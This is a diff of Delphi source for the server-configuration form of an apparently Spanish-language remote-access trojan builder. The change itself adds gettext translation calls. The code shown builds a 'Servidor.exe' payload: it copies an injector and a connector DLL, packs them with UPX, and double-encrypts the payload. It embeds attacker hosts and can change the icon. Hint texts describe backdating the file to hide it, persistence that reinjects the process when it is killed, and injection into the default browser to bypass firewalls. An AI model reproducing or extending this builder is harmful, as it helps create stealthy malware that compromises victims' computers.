@@ -9,7 +9,7 @@ uses
   MadRes,      {Unidad para cambiar el icono de un EXE}
   ShellApi,
   ExtCtrls, ComCtrls,
-  UnitVariables;
+  UnitVariables, gnugettext;
 
 type
   TFormConfigServer = class(TForm)
@@ -110,10 +110,10 @@ var
 tmpstr, tmpstr2 : string;
 item   : Tlistitem;
 begin
-  StatusBar.Panels[0].Text := 'Seleccione el servidor que desea modificar.';
+  StatusBar.Panels[0].Text := _('Seleccione el servidor que desea modificar.');
   IconPath := '';
   MemoOutput.Clear;
-  MemoOutput.Lines.Append('> Listo.');
+  MemoOutput.Lines.Append(_('> Listo.'));
   //Icono por defecto
   if FileExists(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\ExeBMP.bmp') then
     ImageIcon.Picture.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\ExeBMP.bmp');
@@ -165,7 +165,7 @@ begin
       EditPluginName.SetFocus;
       Result := False;
       StatusBar.Panels[0].Text :=
-        'Tienes que establecer un nombre al plugin';
+        _('Tienes que establecer un nombre al plugin');
 
       exit;
   end;
@@ -176,7 +176,7 @@ begin
       (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
     begin
       StatusBar.Panels[0].Text :=
-        'Nombre del plugin inválido. No puede tener ninguno de los siguientes carácteres: */?"<>|';
+        _('Nombre del plugin inválido. No puede tener ninguno de los siguientes carácteres:')+' */?"<>|';
       MessageBeep($FFFFFFFF);
       //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
       EditCopyTo.SetFocus;
@@ -192,7 +192,7 @@ begin
       (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
     begin
       StatusBar.Panels[0].Text :=
-        'Ruta inválida. No puede tener ninguno de los siguientes carácteres: */?"<>|';
+        _('Ruta inválida. No puede tener ninguno de los siguientes carácteres:')+' */?"<>|';
       MessageBeep($FFFFFFFF);
       //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
       EditCopyTo.SetFocus;
@@ -207,9 +207,9 @@ procedure TFormConfigServer.ImageIconClick(Sender: TObject);
 begin
   with OpenDialog do
   begin
-    Title      := 'Abrir icono...';
+    Title      := _('Abrir icono...');
     Options    := [ofFileMustExist]; //solo deja seleccionar archivos que existan
-    Filter     := 'Icono (*.ico)|*.ico';
+    Filter     := _('Icono')+' (*.ico)|*.ico';
     DefaultExt := 'ico';
     InitialDir := GetCurrentDir();
     if Execute then
@@ -258,7 +258,7 @@ begin
   borrararchivo(extractfiledir(paramstr(0))+'\~monitor.dll');
   borrararchivo(extractfiledir(paramstr(0))+'\~conectador.dll');
   if not exito then
-  borrararchivo(extractfiledir(paramstr(0))+'\Servidor.exe');
+  borrararchivo(extractfiledir(paramstr(0))+'\'+_('Servidor.exe'));
 end;
 
 procedure TFormConfigServer.BtnGuardarConfigClick(Sender: TObject);
@@ -274,7 +274,7 @@ var
   ProcInfo: TProcessInformation;
 begin
   finalizarinstalacion(true); //Para borrar los archivos de alguna otra instalacion si existiesen
-  Servidor := extractfiledir(paramstr(0))+'\Servidor.exe';
+  Servidor := extractfiledir(paramstr(0))+'\'+_('Servidor.exe');
   randomize;
   if checkboxcifrar.checked then
   begin
@@ -292,7 +292,7 @@ begin
   if ComprobarDatosValidos() then
   begin
     //Primero copiamos los archivos necesarios
-    MemoOutput.Lines.Append('> Copiando los archivos necesarios...');
+    MemoOutput.Lines.Append(_('> Copiando los archivos necesarios...'));
 
     if CheckBoxInyectar.Checked then   //con inyección
     begin
@@ -301,32 +301,32 @@ begin
         CopyFile(pchar(extractfiledir(paramstr(0))+'\Recursos\Jeringa.exe'), pchar(Servidor),false)
       else
       begin
-        StatusBar.Panels[0].Text := 'El archivo Jeringa.exe no existe';
-        MemoOutput.Lines.Append('> Error: El archivo Jeringa.exe no existe');
+        StatusBar.Panels[0].Text := _('El archivo Jeringa.exe no existe');
+        MemoOutput.Lines.Append(_('> Error: El archivo Jeringa.exe no existe'));
         exit;
       end;
-      MemoOutput.Lines.Append('> Jeringa.exe correctamente copiado.');
+      MemoOutput.Lines.Append(_('> Jeringa.exe correctamente copiado.'));
 
       if(fileexists(extractfiledir(paramstr(0))+'\Recursos\conectador.dll')) then
           CopyFile(pchar(extractfiledir(paramstr(0))+'\Recursos\conectador.dll'), pchar(extractfiledir(paramstr(0))+'\~conectador.dll'),false)
       else
       begin
         FinalizarInstalacion(false);
-        StatusBar.Panels[0].Text := 'El archivo Conectador.dll no existe.';
-        MemoOutput.Lines.Append('> Error: El archivo Conectador.dll no existe.');
+        StatusBar.Panels[0].Text := _('El archivo Conectador.dll no existe.');
+        MemoOutput.Lines.Append(_('> Error: El archivo Conectador.dll no existe.'));
         exit;
       end;
-          MemoOutput.Lines.Append('> Conectador.dll correctamente copiado.');
+          MemoOutput.Lines.Append(_('> Conectador.dll correctamente copiado.'));
 
       if(CheckBoxUPX.Checked) then
       begin
-        MemoOutput.Lines.Append('Comprimiendo conectador.dll con UPX...');
+        MemoOutput.Lines.Append(_('Comprimiendo conectador.dll con UPX...'));
         FillChar(StartInfo, SizeOf(StartInfo), 0);
         StartInfo.cb := SizeOf(StartInfo);
 
         CreateProcess(PChar(extractfiledir(paramstr(0))+'\Recursos\upx.exe'), pchar(' '+extractfiledir(paramstr(0))+'\~conectador.dll'), nil, nil, false, 0,nil, nil, StartInfo, ProcInfo);
         WaitForSingleObject(ProcInfo.hProcess, INFINITE);  //Esperamos a que acabe
-        MemoOutput.Lines.Append('Comprimidos!');
+        MemoOutput.Lines.Append(_('Comprimidos!'));
       end;
 
       conectador := cifrar(cifrar(leerarchivo(extractfiledir(paramstr(0))+'\~conectador.dll'),num),num2);
@@ -338,21 +338,21 @@ begin
           CopyFile(pchar(extractfiledir(paramstr(0))+'\Recursos\conectador.exe'), pchar(Servidor),false)
         else
         begin
-          StatusBar.Panels[0].Text := 'El archivo conectador.exe no existe.';
-          MemoOutput.Lines.Append('> Error: El archivo conectador.exe no existe.');
+          StatusBar.Panels[0].Text := _('El archivo conectador.exe no existe.');
+          MemoOutput.Lines.Append(_('> Error: El archivo conectador.exe no existe.'));
           exit;
         end;
-         MemoOutput.Lines.Append('> Conectador.exe correctamente copiado.');
+         MemoOutput.Lines.Append(_('> Conectador.exe correctamente copiado.'));
     end;
 
 
     if(checkboxinyectar.Checked) then
     begin
-      MemoOutput.Lines.Append('> Conectador.dll añadida => +('+inttostr(length(conectador))+')');
-      MemoOutput.Lines.Append('> Escribiendo la configuración al servidor...');
+      MemoOutput.Lines.Append(_('> Conectador.dll añadida')+' => +('+inttostr(length(conectador))+')');
+      MemoOutput.Lines.Append(_('> Escribiendo la configuración al servidor...'));
     end
     else
-    MemoOutput.Lines.Append('> Escribiendo la configuración al servidor...');
+    MemoOutput.Lines.Append(_('> Escribiendo la configuración al servidor...'));
     New(ConfigToSave);
     ConfigToSave.sHosts := '';
     for i := 0 to ListViewConexionesConfig.Items.Count - 1 do
@@ -374,23 +374,23 @@ begin
     ConfigToSave.bPersistencia := CheckboxPersistencia.Checked;
     if WriteSettings(PChar(Servidor), ConfigToSave, conectador) = True then
     begin
-      StatusBar.Panels[0].Text := 'La configuración se guardó con éxito.';
-      MemoOutput.Lines.Append('> La configuración se guardó con éxito.');
+      StatusBar.Panels[0].Text := _('La configuración se guardó con éxito.');
+      MemoOutput.Lines.Append(_('> La configuración se guardó con éxito.'));
       FinalizarInstalacion(true);
     end
     else
     begin
       MessageBeep($FFFFFFFF);
-      StatusBar.Panels[0].Text := 'No se pudo guardar la configuración.';
-      MemoOutput.Lines.Append('> No se pudo guardar la configuración.');
+      StatusBar.Panels[0].Text := _('No se pudo guardar la configuración.');
+      MemoOutput.Lines.Append(_('> No se pudo guardar la configuración.'));
      // FinalizarInstalacion(false);
     end;
     Dispose(ConfigToSave); //Libera la configuracion
     if IconPath <> '' then //cambiar icono
     begin
-      MemoOutput.Lines.Append('> Cambiando el icono al servidor...');
+      MemoOutput.Lines.Append(_('> Cambiando el icono al servidor...'));
       if UpdateExeIcon(Servidor, 'MAINICON', IconPath) = True then
-        MemoOutput.Lines.Append('> El ícono se cambió con éxito.')
+        MemoOutput.Lines.Append(_('> El ícono se cambió con éxito.'))
       else
         MemoOutput.Lines.Append('> No se pudo cambiar el ícono.');
     end;
@@ -408,7 +408,7 @@ begin
   if not (key in ['0'..'9', #8]) then
   begin
     key := #0;
-    StatusBar.Panels[0].Text := 'Este campo solo admite números';
+    StatusBar.Panels[0].Text := _('Este campo solo admite números');
     MessageBeep($FFFFFFFF);
   end;
 end;
@@ -418,7 +418,7 @@ begin
   if key = '|' then
   begin
     key := #0;
-    StatusBar.Panels[0].Text := 'Este campo no admite el caracter: |';
+    StatusBar.Panels[0].Text := _('Este campo no admite el caracter: |');
     MessageBeep($FFFFFFFF);
   end;
 end;
@@ -450,30 +450,30 @@ begin
   Application.HintPause     := 200;
 
   //Hints para la ruta
-  s := 'Se pueden poner variables en la ruta que serán reemplazadas cuando se ejecute el servidor.'
+  s := _('Se pueden poner variables en la ruta que serán reemplazadas cuando se ejecute el servidor.')
     +
-    #13#10 + 'Las variables aceptadas son:' + #13#10#13#10 +
-    '%WinDir% -> Se reemplaza por el directorio de Windows (Por ejemplo C:\Windows\)' +
-    #13#10 + '%SysDir% -> Se reemplaza por el directorio de sistema (Por ejemplo C:\System32\)'
+    #13#10 + _('Las variables aceptadas son:') + #13#10#13#10 +
+    _('%WinDir% -> Se reemplaza por el directorio de Windows (Por ejemplo C:\Windows\)') +
+    #13#10 + _('%SysDir% -> Se reemplaza por el directorio de sistema (Por ejemplo C:\System32\)')
     +
-    #13#10 + '%TempDir% -> Se reemplaza por el directorio de archivos temporales (Por ejemplo C:\Temp\)' +
-    #13#10 + '%AppDir% -> Se reemplaza por el directorio de datos de aplicaciones (Por ejemplo C:\Documents and Settings\user\appdata\) (Recomendado)' +
-    #13#10 + '%RootDir% -> Se reemplaza por la ruta principal del directorio de Windows (Por ejemplo C:\)';
+    #13#10 + _('%TempDir% -> Se reemplaza por el directorio de archivos temporales (Por ejemplo C:\Temp\)') +
+    #13#10 + _('%AppDir% -> Se reemplaza por el directorio de datos de aplicaciones (Por ejemplo C:\Documents and Settings\user\appdata\) (Recomendado)') +
+    #13#10 + _('%RootDir% -> Se reemplaza por la ruta principal del directorio de Windows (Por ejemplo C:\)');
   EditCopyTo.Hint := s;
 
-  s := 'Cuando el servidor sea copiado a la carpeta de destino, su fecha de' + #13#10 +
-    'modificación cambiará por una anterior de modo que no pueda encotrarse' + #13#10 +
-    'de modo que no pueda encontrarse facilmente al listar archivos por fecha' + #13#10 +
-    'de modificación.';
+  s := _('Cuando el servidor sea copiado a la carpeta de destino, su fecha de') + #13#10 +
+    _('modificación cambiará por una anterior de modo que no pueda encotrarse') + #13#10 +
+    _('de modo que no pueda encontrarse facilmente al listar archivos por fecha') + #13#10 +
+    _('de modificación.');
   CheckBoxCopiarConFechaAnterior.Hint := s;
 
-  s := 'Cuando el proceso servidor sea matado volvera a iniciarse e inyectarse' {+ #13#10 +
+  s := _('Cuando el proceso servidor sea matado volvera a iniciarse e inyectarse') {+ #13#10 +
     'Si es matado más de tres veces se inyectara en explorer.exe para no ser tan visible' + #13#10+
     'Si el archivo donde se instala es borrado volverá a copiarse en otro directorio con un nombre aleatorio'};
   CheckBoxPersistencia.Hint := s;
 
-    s := 'El servidor se inyectará en el navegador predeterminado para saltarse firewalls' + #13#10 +
-    'Atención: Activar esta opción incrementa el tamaño del servidor';
+    s := _('El servidor se inyectará en el navegador predeterminado para saltarse firewalls') + #13#10 +
+    _('Atención: Activar esta opción incrementa el tamaño del servidor');
   CheckBoxInyectar.Hint := s;
 end;
 
@@ -489,7 +489,7 @@ begin
       (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
     begin
       StatusBar.Panels[0].Text :=
-        'IP o DNS inválida. No puede tener ninguno de los siguientes carácteres: */?"<>|';
+        _('IP o DNS inválida. No puede tener ninguno de los siguientes carácteres:')+' */?"<>|';
       MessageBeep($FFFFFFFF);
       //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
       EditIP.SetFocus;
